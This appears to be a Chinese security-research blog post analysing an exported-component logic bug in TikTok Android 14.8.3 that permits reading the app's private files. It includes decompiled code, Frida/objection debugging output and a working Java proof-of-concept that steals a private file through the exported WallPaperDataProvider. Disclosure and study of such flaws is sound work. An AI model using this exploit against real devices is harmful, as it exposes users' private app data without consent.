---
layout: post
title:  "[ByteDance] [TikTok] WallPaperDataProvider导出存在任意私有文件读取漏洞"
date:   2020-05-04 18:00:00 +520
categories: Android_Security
tags: [AndroidApplication, LogicBug, ExportedComponent]
---

| 日期 | 版本 | 描述 | 作者 |
| :-: | :-: | :-: | :-: |
| 2020.05.04 | 1.0 | 完整的漏洞分析与利用 | wnagzihxa1n |

## 0x00 漏洞概述

## 0x01 触发条件

| 上线时间 | 应用名 | 包名 | 软件版本 | 下载链接 |
| :-: | :-: | :-: | :-: | :-: |
| 2020.02.08 | TikTok | com.zhiliaoapp.musically | 14.8.3 | https://www.apkmirror.com/apk/tiktok-pte-ltd/tik-tok-including-musical-ly/tik-tok-including-musical-ly-14-8-3-release/ |

## 0x02 PoC

## 0x03 前置知识

## 0x04 Root Cause

组件`com.ss.android.ugc.aweme.livewallpaper.ui.LiveWallPaperPreviewActivity`导出

```xml
<activity 
    android:exported="true" android:name="com.ss.android.ugc.aweme.livewallpaper.ui.LiveWallPaperPreviewActivity"
    android:screenOrientation="1" 
    android:theme="@style/ac"/>
```

`com.ss.android.ugc.aweme.livewallpaper.ui.LiveWallPaperPreviewActivity`会从传入Intent的键`live_wall_paper`获取类型为`LiveWallPaperBean`的对象数据并赋值给全局变量`mLiveWallPaperBean`

```java
@Override  // com.ss.android.ugc.aweme.base.activity.AmeSSActivity
public void onCreate(Bundle bundle) {
    super.onCreate(bundle);
    this.mLiveWallPaperBean = (LiveWallPaperBean)this.getIntent().getParcelableExtra("live_wall_paper");
    if(this.mLiveWallPaperBean == null) {
        this.finish();
        return;
    }
    
    ...
}
```

这个Activity界面上有一个按钮

![IMAGE](/assets/resources/6D7248E6D3F462B948D743C4339E4CB5.jpg)

按钮点击回调会调用方法`setLiveWallPaper()`

```java
// com.ss.android.ugc.aweme.livewallpaper.ui.LiveWallPaperPreviewActivity_ViewBinding
public class LiveWallPaperPreviewActivity_ViewBinding implements Unbinder {

    public LiveWallPaperPreviewActivity_ViewBinding(LiveWallPaperPreviewActivity arg4, View arg5) {
        View v0_1 = Utils.findRequiredView(arg5, 0x7F141A55, "method \'setLiveWallPaper\'");  // id:dfr
        this.c = v0_1;
        v0_1.setOnClickListener(new DebouncingOnClickListener() {
            @Override  // butterknife.internal.DebouncingOnClickListener
            public final void doClick(View arg1) {
                arg4.setLiveWallPaper();
            }
        });
        
       ... 
    }
    
    ...
}
```

方法`setLiveWallPaper()`将刚才的全局变量`mLiveWallPaperBean`写入`com.ss.android.ugc.aweme.livewallpaper.c.c.f`，这个变量也是一个`LiveWallPaperBean`

```java
public void setLiveWallPaper() {
    ...
    
    this.mLiveWallPaperBean.setSource("paper_set");
    c v0 = c.a();
    LiveWallPaperBean liveWallPaperBean = this.mLiveWallPaperBean;
    v0.mLiveWallPaperBean.setId(liveWallPaperBean.getId());
    v0.mLiveWallPaperBean.setThumbnailPath(liveWallPaperBean.getThumbnailPath());
    v0.mLiveWallPaperBean.setVideoPath(liveWallPaperBean.getVideoPath());
    v0.mLiveWallPaperBean.setWidth(liveWallPaperBean.getWidth());
    v0.mLiveWallPaperBean.setHeight(liveWallPaperBean.getHeight());
    v0.mLiveWallPaperBean.setSource(liveWallPaperBean.getSource());
    c.a().a(this);
    String v0_1 = this.mLiveWallPaperBean.getId();
    ...
}
```

注意这里是使用`c.a()`的形式获取实例

```java
public final class c {
    private static c f;
    ...
    
    public static c a() {
        return c.f;
    }
    
    ...
}
```

总结一下第一步就是导出组件`com.ss.android.ugc.aweme.livewallpaper.ui.LiveWallPaperPreviewActivity`传入一个Intent，点击按钮后可以更改掉一个对象实例的内部数据

要注意一点，这里会有缓存的问题，比如原先已经设置了，就会出现设置后的值，我测试的时候设置为`/data/user/0/com.zhiliaoapp.musically/app_webview/metrics_guid`，所以在默认的情况下会出现这个值，包括`width`和`height`也是

```shell
➜  /Users/wnagzihxa1n -> objection -g com.zhiliaoapp.musically explore
com.zhiliaoapp.musically on (google: 8.1.0) [usb] # plugin load FRIDA/Wallbreaker
Loaded plugin: wallbreaker
com.zhiliaoapp.musically on (google: 8.1.0) [usb] # plugin wallbreaker objectsearch com.ss.android.ugc.aweme.livewallpaper.model.LiveWallPaperBean
(agent) [571691] Called com.ss.android.ugc.aweme.livewallpaper.model.LiveWallPaperBean.toString()
[0x2aa2]: LiveWallPaperBean{id='null', thumbnailPath='null', videoPath='/data/user/0/com.zhiliaoapp.musically/app_webview/metrics_guid', width=100, height=100, source=paper_set}
```

看一下细节

```java
com.zhiliaoapp.musically on (google: 8.1.0) [usb] # plugin wallbreaker objectdump 0x2aa2

class LiveWallPaperBean {

	/* static fields */
	static Parcelable$Creator CREATOR; => [0x29f6]: com.ss.android.ugc.aweme.livewallpaper.model.LiveWallPaperBean$1@df43bd3

	/* instance fields */
	int height; => 100
	String id; => null
	String source; => paper_set
	String thumbnailPath; => null
	String videoPath; => /data/user/0/com.zhiliaoapp.musically/app_webview/metrics_guid
	int width; => 100
	
	...
}
```

类`com.ss.android.ugc.aweme.livewallpaper.model.LiveWallPaperBean`包含一个变量`videoPath`，方法`getVideoPath()`和`setVideoPath()`，这个值在后面的利用会用到

```java
public class LiveWallPaperBean implements Parcelable {
    private String videoPath;
    ...
    
    public String getVideoPath() {
        return this.videoPath;
    }
    
    public void setVideoPath(String videoPath) {
        this.videoPath = videoPath;
    }
    
    ...
```

组件`com.ss.android.ugc.aweme.livewallpaper.WallPaperDataProvider`导出

```xml
<provider 
    android:authorities="com.zhiliaoapp.musically.wallpapercaller" 
    android:exported="true" 
    android:name="com.ss.android.ugc.aweme.livewallpaper.WallPaperDataProvider"/>
```

方法`openFile()`会获通过方法`c.a()`获取到上面修改过数据后的对象实例`mLiveWallPaperBean`的字段`videoPath`，主要这个字段我们可控，最后直接返回这个文件

```java
public class WallPaperDataProvider extends ContentProvider {
    public static final Uri uri_video_path;
    public static final Uri uri_video_width;
    public static final Uri uri_video_height;
    public static final Uri uri_fall_back_video_path;
    public static final Uri uri_set_wp_result;
    public static final Uri uri_source;
    private UriMatcher uriMatcher;
    private Handler handler;

    static {
        WallPaperDataProvider.uri_video_path = Uri.parse("content://com.zhiliaoapp.musically.wallpapercaller/video_path");
        WallPaperDataProvider.uri_video_width = Uri.parse("content://com.zhiliaoapp.musically.wallpapercaller/video_width");
        WallPaperDataProvider.uri_video_height = Uri.parse("content://com.zhiliaoapp.musically.wallpapercaller/video_height");
        WallPaperDataProvider.uri_fall_back_video_path = Uri.parse("content://com.zhiliaoapp.musically.wallpapercaller/fall_back_video_path");
        WallPaperDataProvider.uri_set_wp_result = Uri.parse("content://com.zhiliaoapp.musically.wallpapercaller/set_wp_result");
        WallPaperDataProvider.uri_source = Uri.parse("content://com.zhiliaoapp.musically.wallpapercaller/source");
    }

    @Override  // android.content.ContentProvider
    public boolean onCreate() {
        this.uriMatcher = new UriMatcher(-1);
        if(!TextUtils.isEmpty("com.zhiliaoapp.musically.wallpapercaller")) {
            this.uriMatcher.addURI("com.zhiliaoapp.musically.wallpapercaller", "video_path", 0x10);
            this.uriMatcher.addURI("com.zhiliaoapp.musically.wallpapercaller", "fall_back_video_path", 0x20);
            this.uriMatcher.addURI("com.zhiliaoapp.musically.wallpapercaller", "set_wp_result", 0x30);
            this.uriMatcher.addURI("com.zhiliaoapp.musically.wallpapercaller", "video_width", 0x40);
            this.uriMatcher.addURI("com.zhiliaoapp.musically.wallpapercaller", "video_height", 80);
            this.uriMatcher.addURI("com.zhiliaoapp.musically.wallpapercaller", "source", 0x60);
        }

        this.handler = new Handler(Looper.getMainLooper());
        return 0;
    }

    @Override  // android.content.ContentProvider
    public ParcelFileDescriptor openFile(Uri uri, String mode) throws FileNotFoundException {
        String videoPath = "";
        int match = this.uriMatcher.match(uri);
        if(match == 0x10) {
            videoPath = c.a().mLiveWallPaperBean.getVideoPath();
        }
        else if(match == 0x20) {
            videoPath = e.b();
        }

        try {
            return ParcelFileDescriptor.open(new File(videoPath), 0x10000000);
        }
        catch(Exception unused_ex) {
            return null;
        }
    }
    
    ...
}
```

总结下这个漏洞：导出组件`com.ss.android.ugc.aweme.livewallpaper.ui.LiveWallPaperPreviewActivity`能修改掉一个对象实例的字段，导出组件`com.ss.android.ugc.aweme.livewallpaper.WallPaperDataProvider`会获取上述对象实例的字段`videoPath`作为路径进行文件打开

常规扫描器最多只能扫描出来组件`com.ss.android.ugc.aweme.livewallpaper.WallPaperDataProvider`导出可能存在问题，将两个组件的行为通过变量赋值读取行为进行关联，大概率是使用污点分析

## 0x05 漏洞调试与利用

漏洞利用不复杂，因为传入的是序列化后的私有类对象，我们需要在PoC里添加这个私有类，有个简单办法是直接把`classes.dex`文件转换为Jar包，作为第三方库导入，这个应用有很多的Dex文件，这个版本的`com.ss.android.ugc.aweme.livewallpaper.model.LiveWallPaperBean`在文件`classes5.dex`，在启动导出组件`com.ss.android.ugc.aweme.livewallpaper.ui.LiveWallPaperPreviewActivity`后，PoC会延迟五秒，这个时间用于点击按钮来实现数据写入，五秒后开始查询，将查询到的结果在日志里输出

```java
public class MainActivity extends Activity {
    String theft = "/data/user/0/com.zhiliaoapp.musically/app_webview/metrics_guid";
    
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        LiveWallPaperBean liveWallPaperBean = LiveWallPaperBean.buildEmptyBean();
        liveWallPaperBean.setHeight(100);
        liveWallPaperBean.setWidth(100);
        liveWallPaperBean.setId("1337");
        liveWallPaperBean.setSource(theft);
        liveWallPaperBean.setThumbnailPath(theft);
        liveWallPaperBean.setVideoPath(theft);

        Intent intent = new Intent();
        intent.setClassName(
                "com.zhiliaoapp.musically", 
                "com.ss.android.ugc.aweme.livewallpaper.ui.LiveWallPaperPreviewActivity");
        intent.putExtra("live_wall_paper", liveWallPaperBean);
        startActivity(intent);

        Uri uri = Uri.parse("content://com.zhiliaoapp.musically.wallpapercaller/video_path");
        new Handler().postDelayed(() -> {
            try {
                InputStream inputStream = getContentResolver().openInputStream(uri);
                BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(inputStream));
                String lineStr = null;
                while ((lineStr = bufferedReader.readLine()) != null) {
                    Log.e(TAG, "onCreate: ==> " + lineStr);
                }
                bufferedReader.close();
            }
            catch (Throwable th) {
                throw new RuntimeException(th);
            }
        }, 5000);
    }
}
```

日志

```shell
10537-10537/com.wnagzihxa1n.myapplication E/ContentValues: onCreate: ==> 58dae009-5f23-43b1-8377-fa770cb3925a
```

## 0x06 漏洞研究

## 0x07 References

- https://blog.oversecured.com/Oversecured-detects-dangerous-vulnerabilities-in-the-TikTok-Android-app/

## 附录：调试过程记录